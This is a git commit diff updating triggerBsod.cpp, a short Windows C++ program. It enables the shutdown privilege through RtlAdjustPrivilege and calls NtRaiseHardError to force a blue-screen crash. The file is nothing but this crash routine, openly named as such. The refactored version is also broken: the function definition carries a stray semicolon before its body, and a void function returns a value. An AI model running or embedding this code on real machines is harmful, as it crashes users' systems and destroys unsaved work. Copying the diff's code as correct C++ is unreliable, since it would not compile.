e4967411b286d2ffe89eea2f49869220eded5d18
Sid <sidhys1@gmail.com>
2021-08-30 20:04:02 -0400

    Update triggerBsod.cpp

--- triggerBsod.cpp
+++ triggerBsod.cpp
@@ -1,22 +1,31 @@
 #include <Windows.h>
-#include <winternl.h> // Removable 
+#include "triggerBSOD.hpp"
 
-using namespace std; // Removable 
+using namespace triggerBsodNamespace;
 
 #pragma comment(lib, "ntdll.lib")
 
-extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
+extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(
+ULONG Privilege,
+BOOLEAN Enable,
+BOOLEAN CurrThread,
+PBOOLEAN StatusPointer);
 
-/* Calling a Hard Error creates a snapshot of your memory, in %SystemRoot% with the name 'memory.dmp' (this file can take up tons of space, I'd advise to delete it after) */
-extern "C" NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
-    PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);
+extern "C" NTSTATUS NTAPI NtRaiseHardError(
+NTSTATUS ErrorStatus, 
+ULONG NumberOfParameters,
+ULONG UnicodeStringParameterMask, 
+PULONG_PTR Parameters,
+ULONG ValidResponseOption, 
+PULONG Response);
 
 
-int main()
+void triggerBsod::raiseHardError();
 {
+    
     BOOLEAN bl;
     unsigned long response;
     RtlAdjustPrivilege(19, true, false, &bl);
     NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
-    return 0;
+    return 0; 
 }
